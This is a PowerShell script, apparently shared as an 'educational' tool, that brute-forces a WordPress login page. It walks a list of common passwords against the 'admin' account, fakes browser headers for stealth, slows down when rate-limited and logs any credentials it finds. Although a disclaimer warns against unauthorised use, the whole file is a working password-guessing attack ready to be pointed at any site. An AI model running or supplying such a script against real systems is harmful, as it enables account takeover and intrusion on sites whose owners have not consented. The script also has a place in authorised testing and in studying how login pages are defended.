# WordPress Brute Force Script - Fixed Edition
# Author: Lehlohonolo Pakeng
# License: MIT License (see LICENSE file)
# 
# WARNING: This script is for EDUCATIONAL PURPOSES ONLY. Unauthorized use of this script
# to attack systems without explicit permission is ILLEGAL and UNETHICAL. Use responsibly
# and only in controlled environments with proper authorization.
#
# Description: A PowerShell script to demonstrate brute force techniques against a WordPress
# login page. Includes basic stealth headers, logging, and error handling.

# Check PowerShell version
if ($PSVersionTable.PSVersion.Major -lt 3) {
    Write-Host "Error: This script requires PowerShell 3.0 or higher. Current version: $($PSVersionTable.PSVersion)" -ForegroundColor Red
    exit
}

# Configuration
$targetUrl = "https://example.com/wp-login.php"  # Replace with authorized target URL
$username = "admin"                             # Target username
$passwordListPath = ".\10k-most-common.txt"     # Path to password list
$logFile = "wp_brute_log_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$delayMs = 1000                                 # Delay between attempts (ms)

# Headers for basic stealth
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
    "Cookie" = "wordpress_test_cookie=WP+Cookie+check"
    "Referer" = $targetUrl
}

# Initialize variables
$attemptCount = 0
$found = $false

try {
    # Load password list
    Write-Host "Loading password list..." -ForegroundColor Yellow
    if (-not (Test-Path $passwordListPath)) {
        throw "Password list not found at: $passwordListPath"
    }
    $passwordList = Get-Content -Path $passwordListPath -ErrorAction Stop
    Write-Host "Loaded $($passwordList.Count) passwords" -ForegroundColor Green

    # Brute force loop
    foreach ($password in $passwordList) {
        $attemptCount++
        
        # Prepare request body
        $body = @{
            "log" = $username
            "pwd" = $password.Trim()
            "wp-submit" = "Log+In"
            "testcookie" = "1"
        }

        try {
            # Send HTTP POST request
            $response = Invoke-WebRequest -Uri $targetUrl -Method Post -Headers $headers -Body $body -ErrorAction Stop
            $logMessage = "$(Get-Date) - Attempt $attemptCount - Status: $($response.StatusCode) - Password: $password"
            Write-Host $logMessage
            Add-Content -Path $logFile -Value $logMessage -ErrorAction Stop

            # Check for successful login
            if ($response.StatusCode -eq 200 -and $response.Content -like "*Dashboard*") {
                $successMessage = "SUCCESS! Credentials found: $username : $password"
                Write-Host $successMessage -ForegroundColor Green
                Add-Content -Path $logFile -Value $successMessage -ErrorAction Stop
                $found = $true
                break
            }

        } catch {
            $errorMessage = "$(Get-Date) - Attempt $attemptCount - Error: $($_.Exception.Message) - Password: $password"
            Write-Host $errorMessage -ForegroundColor Red
            Add-Content -Path $logFile -Value $errorMessage -ErrorAction Stop

            # Handle rate limiting (HTTP 429)
            if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 429) {
                Write-Host "Rate limit detected, pausing for 5 seconds..." -ForegroundColor Yellow
                Start-Sleep -Seconds 5
            }
        }

        # Delay to avoid overwhelming the server
        Start-Sleep -Milliseconds $delayMs
    }

    # Report final status
    if (-not $found) {
        Write-Host "No credentials found after $attemptCount attempts" -ForegroundColor Yellow
        Add-Content -Path $logFile -Value "No credentials found after $attemptCount attempts"
    }

} catch {
    $criticalError = "$(Get-Date) - Critical error: $($_.Exception.Message)"
    Write-Host $criticalError -ForegroundColor Red
    Add-Content -Path $logFile -Value $criticalError -ErrorAction Stop
} finally {
    Write-Host "Brute force attempt completed" -ForegroundColor Cyan
    Write-Host "Log saved to: $logFile" -ForegroundColor Cyan
}